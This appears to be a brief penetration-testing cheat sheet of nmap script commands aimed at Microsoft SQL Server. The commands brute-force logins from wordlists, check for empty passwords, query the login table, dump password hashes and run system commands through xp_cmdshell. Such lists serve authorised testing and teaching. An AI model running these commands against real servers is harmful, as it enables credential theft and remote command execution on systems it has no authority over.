## nmap
```
nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
nmap --script ms-sql-info <target>
nmap --script ms-sql-brute --script-args userdb=/root/Desktop/Wordlist/common_users.txt,passdb=/path/to/wordlist
nmap --script ms-sql-empty-password <target>
nmap --script ms-sql-query --script-args 'mssql.username=" ", mssql.password=" ", ms-sql-query.query="SELECT * FROM master..syslogins"' <target>
nmap --script ms-sql-dump-hashes --script-args 'mssql.username=" ", mssql.password=" " ' <target>
nmap --script ms-sql-xp-cmdshell --script-args 'mssql.username=" ", mssql.password=" ", ms-sql-xp-cmdshell.cmd="whoami /all" ' <target>
```
